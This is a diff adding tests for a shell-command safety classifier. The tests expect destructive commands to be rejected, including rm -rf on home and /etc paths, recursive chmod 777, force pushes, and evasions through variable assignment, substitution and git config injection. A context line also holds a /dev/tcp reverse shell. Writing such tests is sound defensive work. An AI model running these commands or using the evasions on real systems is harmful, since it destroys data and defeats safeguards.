@@ -914,6 +914,138 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("system-path equivalents (round 7)", () => {
+    test("rm -rf ~/ (home with slash)", () => {
+      expect(classifyCommand("rm -rf ~/").ok).toBe(false);
+    });
+
+    test("rm -rf ~/.ssh (home subpath)", () => {
+      expect(classifyCommand("rm -rf ~/.ssh").ok).toBe(false);
+    });
+
+    test("rm -rf /./etc (dot-segment)", () => {
+      expect(classifyCommand("rm -rf /./etc").ok).toBe(false);
+    });
+
+    test("rm -rf //etc (repeated leading slash)", () => {
+      expect(classifyCommand("rm -rf //etc").ok).toBe(false);
+    });
+
+    test("rm -rf /././/etc (combined dot + slash)", () => {
+      expect(classifyCommand("rm -rf /././/etc").ok).toBe(false);
+    });
+
+    test("chmod -R 777 //etc (repeated slash)", () => {
+      expect(classifyCommand("chmod -R 777 //etc").ok).toBe(false);
+    });
+
+    test("chmod -R 777 /./usr (dot-segment)", () => {
+      expect(classifyCommand("chmod -R 777 /./usr").ok).toBe(false);
+    });
+  });
+
+  describe("assignment-builtin prefix resolution (round 7)", () => {
+    test('export target=/etc; rm -rf "$target"', () => {
+      expect(classifyCommand('export target=/etc; rm -rf "$target"').ok).toBe(false);
+    });
+
+    test("declare target=/etc; rm -rf $target", () => {
+      expect(classifyCommand("declare target=/etc; rm -rf $target").ok).toBe(false);
+    });
+
+    test("readonly force=--force; git push $force origin main", () => {
+      expect(classifyCommand("readonly force=--force; git push $force origin main").ok).toBe(false);
+    });
+
+    test("typeset hard=--hard; git reset $hard", () => {
+      expect(classifyCommand("typeset hard=--hard; git reset $hard").ok).toBe(false);
+    });
+
+    test("local target=/etc; rm -rf $target", () => {
+      expect(classifyCommand("local target=/etc; rm -rf $target").ok).toBe(false);
+    });
+
+    test("export -g force=--force; git push $force origin main (with flag)", () => {
+      expect(classifyCommand("declare -g force=--force; git push $force origin main").ok).toBe(
+        false,
+      );
+    });
+  });
+
+  describe("unresolved expansion in destructive argv (round 7)", () => {
+    test("rm -rf $UNRESOLVED is rejected", () => {
+      expect(classifyCommand("rm -rf $UNRESOLVED").ok).toBe(false);
+    });
+
+    test("git push $FORCE origin main is rejected", () => {
+      expect(classifyCommand("git push $FORCE origin main").ok).toBe(false);
+    });
+
+    test("chmod -R 777 brace-form expansion rejected", () => {
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal bash ${VAR}
+      expect(classifyCommand("chmod -R 777 ${DIR}").ok).toBe(false);
+    });
+
+    test("rm -rf `pwd` backtick substitution rejected", () => {
+      expect(classifyCommand("rm -rf `pwd`").ok).toBe(false);
+    });
+
+    test("rm -rf $(pwd) command substitution rejected", () => {
+      expect(classifyCommand("rm -rf $(pwd)").ok).toBe(false);
+    });
+  });
+
+  describe("git config case-insensitive + PARAMETERS env (round 7)", () => {
+    test("git -c ALIAS.pu=push pu --force origin main (uppercase)", () => {
+      expect(classifyCommand("git -c ALIAS.pu=push pu --force origin main").ok).toBe(false);
+    });
+
+    test("git -c Include.Path=/tmp/evil.cfg pu origin (mixed case)", () => {
+      expect(classifyCommand("git -c Include.Path=/tmp/evil.cfg pu origin").ok).toBe(false);
+    });
+
+    test("GIT_CONFIG_PARAMETERS=\"'alias.pu=!git push --force'\" git pu origin main", () => {
+      expect(
+        classifyCommand("GIT_CONFIG_PARAMETERS=\"'alias.pu=!git push --force'\" git pu origin main")
+          .ok,
+      ).toBe(false);
+    });
+
+    test("GIT_CONFIG_PARAMETERS with include.path", () => {
+      expect(
+        classifyCommand("GIT_CONFIG_PARAMETERS=\"'include.path=/tmp/evil'\" git status").ok,
+      ).toBe(false);
+    });
+  });
+
+  describe("variable-expansion length DoS (round 7)", () => {
+    test("a=$a$a self-referential is not recursively expanded", () => {
+      // This used to let a ~500-byte input blow up to tens of MB. With the
+      // bound, output stays at-or-below MAX_INPUT_LENGTH and classification
+      // returns a reject/accept within constant-ish time.
+      const start = Date.now();
+      const out = classifyCommand("a=xxxxxxxxxx; b=$a$a$a$a$a$a$a$a$a$a; echo $b");
+      const elapsed = Date.now() - start;
+      expect(elapsed).toBeLessThan(100);
+      // Not asserting the verdict here — only that classification terminates
+      // quickly and returns a well-formed result.
+      expect(typeof out.ok).toBe("boolean");
+    });
+
+    test("pathological multi-level expansion is rejected or terminates quickly", () => {
+      // Build an input under MAX_INPUT_LENGTH that references a previously
+      // assigned large value many times.
+      const big = "x".repeat(200);
+      const refs = new Array(40).fill("$a").join(" ");
+      const cmd = `a=${big}; echo ${refs}`;
+      const start = Date.now();
+      const out = classifyCommand(cmd);
+      const elapsed = Date.now() - start;
+      expect(elapsed).toBeLessThan(200);
+      expect(typeof out.ok).toBe("boolean");
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
